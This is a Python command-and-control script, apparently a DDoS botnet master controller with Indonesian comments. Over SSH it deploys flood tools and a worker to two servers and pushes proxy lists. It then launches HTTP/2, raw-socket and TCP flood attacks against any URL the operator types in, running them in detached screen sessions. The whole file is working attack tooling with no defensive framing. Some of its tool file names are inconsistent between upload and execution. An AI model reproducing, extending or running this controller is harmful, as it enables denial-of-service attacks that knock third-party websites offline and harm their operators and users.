#!/usr/bin/env python3
import os
import sys
import json
import time
import threading
import paramiko
from datetime import datetime
import requests
import base64
import hashlib

# Load konfigurasi
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

SERVER1 = CONFIG['server1']
SERVER2 = CONFIG['server2']
SECURITY = CONFIG['security']
ATTACK = CONFIG['attack']

class C2Controller:
    def __init__(self):
        self.servers = {
            'server1': {'config': SERVER1, 'status': 'unknown', 'bots': 0, 'tasks': []},
            'server2': {'config': SERVER2, 'status': 'unknown', 'bots': 0, 'tasks': []}
        }
        self.active_attacks = []
        self.api_key = SECURITY['api_key']
        
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = """
    ╔═══════════════════════════════════════════════════════════════════╗
    ║     ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗         ║
    ║     ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝         ║
    ║     ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║            ║
    ║     ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║            ║
    ║     ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║            ║
    ║     ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝            ║
    ║                    C2 v4.0 - DUAL SERVER AUTO                      ║
    ║                    MASTER CONTROLLER                                ║
    ╚═══════════════════════════════════════════════════════════════════╝
        """
        print(f"\033[96m{banner}\033[0m")
        print(f"\033[93m[•] Server1: {SERVER1['ip']}:{SERVER1['port']} | Max Bots: {SERVER1['max_bots']}\033[0m")
        print(f"\033[93m[•] Server2: {SERVER2['ip']}:{SERVER2['port']} | Max Bots: {SERVER2['max_bots']}\033[0m")
        print(f"\033[93m[•] API Key: {self.api_key[:10]}... | Admin Only: {SECURITY['admin_only']}\033[0m")
        print(f"\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    
    def print_menu(self):
        menu = """
    \033[92m[01]\033[0m attack       - Mulai serangan DDoS (Auto kedua server)
    \033[92m[02]\033[0m status       - Cek status kedua server
    \033[92m[03]\033[0m deploy       - Deploy tools ke kedua server
    \033[92m[04]\033[0m sync         - Sinkronisasi konfigurasi ke server
    \033[92m[05]\033[0m proxy        - Update proxy di semua server
    \033[92m[06]\033[0m tasks        - Lihat task aktif di semua server
    \033[92m[07]\033[0m stop_all     - Hentikan semua serangan
    \033[92m[08]\033[0m clear        - Bersihkan layar
    \033[92m[09]\033[0m exit         - Keluar dari C2
        """
        print(menu)
    
    def ssh_connect(self, server):
        """Koneksi SSH ke server"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                server['config']['ip'],
                port=server['config']['port'],
                username=server['config']['username'],
                password=server['config']['password'],
                timeout=10
            )
            return ssh
        except Exception as e:
            print(f"\033[91m[!] SSH Error ke {server['config']['ip']}: {e}\033[0m")
            return None
    
    def check_server_status(self):
        """Cek status kedua server"""
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Checking {server_name} ({server['config']['ip']})...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Cek uptime
                    stdin, stdout, stderr = ssh.exec_command("uptime")
                    uptime = stdout.read().decode().strip()
                    
                    # Cek apakah worker berjalan
                    stdin, stdout, stderr = ssh.exec_command("ps aux | grep worker.py | grep -v grep")
                    worker = stdout.read().decode().strip()
                    
                    # Cek jumlah bot
                    stdin, stdout, stderr = ssh.exec_command("ls -la /tmp/bots/ 2>/dev/null | wc -l")
                    bot_count = stdout.read().decode().strip() or "0"
                    
                    server['status'] = 'online' if worker else 'no_worker'
                    server['bots'] = bot_count
                    
                    print(f"\033[92m  ✓ Status: Online\033[0m")
                    print(f"\033[92m  ✓ Worker: {'Running' if worker else 'Stopped'}\033[0m")
                    print(f"\033[92m  ✓ Bots: {bot_count}\033[0m")
                    print(f"\033[92m  ✓ Uptime: {uptime[:50]}\033[0m")
                    
                    ssh.close()
                except Exception as e:
                    server['status'] = 'error'
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
            else:
                server['status'] = 'offline'
                print(f"\033[91m  ✗ Status: Offline\033[0m")
    
    def deploy_to_server(self, server_name, server):
        """Deploy tools ke server"""
        print(f"\n\033[96m[•] Deploying to {server_name} ({server['config']['ip']})...\033[0m")
        ssh = self.ssh_connect(server)
        if ssh:
            try:
                # Buat direktori
                commands = [
                    "mkdir -p /root/c2/tools",
                    "mkdir -p /root/c2/logs",
                    "mkdir -p /tmp/bots",
                    "apt-get update -y",
                    "apt-get install -y python3-pip nodejs npm screen",
                    "pip3 install flask requests paramiko psutil",
                    "npm install -g axios http2 net"
                ]
                
                for cmd in commands:
                    print(f"  Running: {cmd}")
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    stdout.channel.recv_exit_status()
                
                # Upload worker.py
                print("  Uploading worker.py...")
                with open('tools/worker.py', 'r') as f:
                    worker_content = f.read()
                
                # Ganti konfigurasi di worker.py
                worker_content = worker_content.replace('{{SERVER_IP}}', server['config']['ip'])
                worker_content = worker_content.replace('{{MASTER_IP}}', SERVER1['ip'])
                
                sftp = ssh.open_sftp()
                with sftp.open('/root/c2/worker.py', 'w') as f:
                    f.write(worker_content)
                
                # Upload tools
                tools = ['H2.js', 'proxy.js', 'TO.js', 'STORMX.py', 'RAW.py']
                for tool in tools:
                    print(f"  Uploading tools/{tool}...")
                    with open(f'tools/{tool}', 'r') as f:
                        tool_content = f.read()
                    with sftp.open(f'/root/c2/tools/{tool}', 'w') as tf:
                        tf.write(tool_content)
                
                sftp.close()
                
                # Buat config.json di server
                server_config = {
                    'worker_name': server_name,
                    'worker_ip': server['config']['ip'],
                    'worker_port': 5001,
                    'master_ip': SERVER1['ip'],
                    'master_port': 5000,
                    'api_key': SECURITY['api_key'],
                    'max_bots': server['config']['max_bots']
                }
                
                print("  Creating config.json...")
                stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{json.dumps(server_config, indent=4)}\nEOF")
                
                # Jalankan worker
                print("  Starting worker...")
                ssh.exec_command("cd /root/c2 && screen -dmS worker python3 worker.py")
                
                print(f"\033[92m  ✓ Deployment to {server_name} complete!\033[0m")
                ssh.close()
                
            except Exception as e:
                print(f"\033[91m  ✗ Error: {e}\033[0m")
    
    def auto_deploy(self):
        """Deploy ke kedua server otomatis"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Auto Deploy ke kedua server...\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        for server_name, server in self.servers.items():
            self.deploy_to_server(server_name, server)
            time.sleep(2)
        
        print("\n\033[92m[✓] Deployment selesai ke kedua server!\033[0m")
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def sync_config(self):
        """Sinkronisasi konfigurasi ke semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Sinkronisasi konfigurasi ke server...\033[0m")
        
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Syncing to {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Update config di server
                    server_config = {
                        'worker_name': server_name,
                        'worker_ip': server['config']['ip'],
                        'worker_port': 5001,
                        'master_ip': SERVER1['ip'],
                        'master_port': 5000,
                        'api_key': SECURITY['api_key'],
                        'max_bots': server['config']['max_bots']
                    }
                    
                    stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{json.dumps(server_config, indent=4)}\nEOF")
                    
                    # Restart worker
                    ssh.exec_command("pkill -f worker.py")
                    time.sleep(2)
                    ssh.exec_command("cd /root/c2 && screen -dmS worker python3 worker.py")
                    
                    print(f"\033[92m  ✓ Synced and restarted\033[0m")
                    ssh.close()
                except Exception as e:
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def update_proxy_all(self):
        """Update proxy di semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Update proxy di semua server...\033[0m")
        
        # Scrape proxy dulu
        print("\n\033[96m[•] Scraping proxy...\033[0m")
        os.system("python3 tools/proxy.py")
        
        if not os.path.exists('proxy.txt'):
            print("\033[91m[!] Gagal mendapatkan proxy\033[0m")
            input("\nEnter to back menu..")
            return
        
        with open('proxy.txt', 'rb') as f:
            proxy_data = f.read()
        
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Uploading to {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    sftp = ssh.open_sftp()
                    with sftp.open('/root/c2/proxy.txt', 'w') as f:
                        f.write(proxy_data.decode())
                    sftp.close()
                    print(f"\033[92m  ✓ Proxy uploaded ({len(proxy_data.splitlines())} proxies)\033[0m")
                    ssh.close()
                except Exception as e:
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def start_attack(self):
        """Mulai serangan menggunakan kedua server"""
        self.clear_screen()
        self.print_banner()
        print("\033[95m[•] Distributed Attack Mode (Auto kedua server)\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        # Pilih metode
        print("\n\033[96mMetode Serangan:\033[0m")
        print("  [1] H2      - HTTP/2 Flood")
        print("  [2] RAW     - Raw Socket Flood")
        print("  [3] TO      - TCP OAST Flood")
        print("  [4] STORMX  - Storm Multilayer")
        print("  [5] ALL     - Semua metode (Distributed)")
        
        method_choice = input("\n\033[93mPilih metode [1-5]:\033[0m ").strip()
        
        methods = {
            '1': 'H2',
            '2': 'RAW',
            '3': 'TO',
            '4': 'STORMX',
            '5': 'ALL'
        }
        
        if method_choice not in methods:
            print("\033[91m[!] Pilihan tidak valid\033[0m")
            time.sleep(1)
            return
        
        method = methods[method_choice]
        
        # Input target
        url = input("\033[93mURL Target:\033[0m ").strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        # Input durasi
        durasi = input(f"\033[93mDurasi (detik) [default: {ATTACK['default_duration']}]:\033[0m ").strip()
        if not durasi:
            durasi = ATTACK['default_duration']
        
        # Input threads per server
        threads = input(f"\033[93mThreads per server [default: {ATTACK['default_threads']}]:\033[0m ").strip()
        if not threads:
            threads = ATTACK['default_threads']
        
        # Input rate
        rate = input("\033[93mRate (requests/second):\033[0m ").strip() or "1000"
        
        print(f"\n\033[92m[✓] Memulai serangan {method} ke {url}\033[0m")
        print(f"\033[92m[✓] Durasi: {durasi} detik, Threads/server: {threads}\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        # Kirim perintah ke kedua server
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Mengirim ke {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Buat command berdasarkan metode
                    if method == "H2":
                        cmd = f"cd /root/c2 && node tools/H2.js {url} {durasi} {rate} {threads} proxy.txt"
                    elif method == "RAW":
                        cmd = f"cd /root/c2 && node tools/RAW.js {url} {durasi} {threads} proxy.txt"
                    elif method == "TO":
                        cmd = f"cd /root/c2 && node tools/TO.js {url} {durasi} {threads} {rate} proxy.txt"
                    elif method == "STORMX":
                        cmd = f"cd /root/c2 && node tools/STORMX.js {url} {durasi} {threads} {rate} proxy.txt"
                    elif method == "ALL":
                        # Random pilih salah satu
                        import random
                        rand_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
                        if rand_method == "H2":
                            cmd = f"cd /root/c2 && node tools/H2.js {url} {durasi} {rate} {threads} proxy.txt"
                        elif rand_method == "RAW":
                            cmd = f"cd /root/c2 && node tools/RAW.js {url} {durasi} {threads} proxy.txt"
                        elif rand_method == "TO":
                            cmd = f"cd /root/c2 && node tools/TO.js {url} {durasi} {threads} {rate} proxy.txt"
                        else:
                            cmd = f"cd /root/c2 && node tools/STORMX.js {url} {durasi} {threads} {rate} proxy.txt"
                    
                    # Jalankan di screen
                    screen_cmd = f"screen -dmS attack_{int(time.time())} {cmd}"
                    stdin, stdout, stderr = ssh.exec_command(screen_cmd)
                    
                    # Simpan task
                    task = {
                        'server': server_name,
                        'method': method,
                        'target': url,
                        'start_time': datetime.now().strftime("%H:%M:%S")
                    }
                    server['tasks'].append(task)
                    self.active_attacks.append(task)
                    
                    print(f"\033[92m  ✓ Serangan dimulai\033[0m")
                    ssh.close()
                    
                except Exception as e:
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
        
        print(f"\n\033[92m[✓] Serangan distributed aktif di kedua server!\033[0m")
        
        # Timer countdown
        for i in range(int(durasi), 0, -10):
            sys.stdout.write(f"\r\033[96m[⏱] Waktu tersisa: {i} detik \033[0m")
            sys.stdout.flush()
            time.sleep(10)
        
        print("\n\n\033[93mEnter to back menu..\033[0m", end="")
        input()
    
    def stop_all_attacks(self):
        """Hentikan semua serangan di semua server"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Menghentikan semua serangan...\033[0m")
        
        for server_name, server in self.servers.items():
            print(f"\n\033[96m[•] Stopping attacks on {server_name}...\033[0m")
            ssh = self.ssh_connect(server)
            if ssh:
                try:
                    # Kill semua proses attack
                    ssh.exec_command("pkill -f H2.js")
                    ssh.exec_command("pkill -f RAW.py")
                    ssh.exec_command("pkill -f TO.js")
                    ssh.exec_command("pkill -f STORMX.py")
                    ssh.exec_command("screen -ls | grep attack | cut -d. -f1 | awk '{print $1}' | xargs -r kill")
                    
                    server['tasks'] = []
                    print(f"\033[92m  ✓ Semua serangan dihentikan\033[0m")
                    ssh.close()
                except Exception as e:
                    print(f"\033[91m  ✗ Error: {e}\033[0m")
        
        self.active_attacks = []
        print("\n\033[92m[✓] Semua serangan telah dihentikan!\033[0m")
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def show_tasks(self):
        """Tampilkan semua task aktif"""
        self.clear_screen()
        self.print_banner()
        print("\n\033[95m[•] Task Aktif di Semua Server:\033[0m")
        print("\033[94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
        
        if not self.active_attacks:
            print("\033[93m[!] Tidak ada task aktif\033[0m")
        else:
            for i, task in enumerate(self.active_attacks, 1):
                print(f"\n\033[96mTask #{i}\033[0m")
                print(f"  Server: {task['server']}")
                print(f"  Method: {task['method']}")
                print(f"  Target: {task['target']}")
                print(f"  Start: {task['start_time']}")
        
        input("\n\033[93mEnter to back menu..\033[0m")
    
    def run(self):
        """Main loop"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            choice = input("\033[93mruiix@[C2-MASTER]>\033[0m ").strip().lower()
            
            if choice in ["1", "attack"]:
                self.start_attack()
            elif choice in ["2", "status"]:
                self.check_server_status()
                input("\n\033[93mEnter to back menu..\033[0m")
            elif choice in ["3", "deploy"]:
                self.auto_deploy()
            elif choice in ["4", "sync"]:
                self.sync_config()
            elif choice in ["5", "proxy"]:
                self.update_proxy_all()
            elif choice in ["6", "tasks"]:
                self.show_tasks()
            elif choice in ["7", "stop_all"]:
                self.stop_all_attacks()
            elif choice in ["8", "clear"]:
                continue
            elif choice in ["9", "exit", "quit"]:
                print("\033[91m[!] Keluar dari C2...\033[0m")
                sys.exit(0)
            else:
                print("\033[91m[!] Pilihan tidak valid!\033[0m")
                time.sleep(1)

if __name__ == "__main__":
    # Cek dependencies
    try:
        import paramiko
    except ImportError:
        os.system("pip3 install paramiko")
    
    controller = C2Controller()
    controller.run()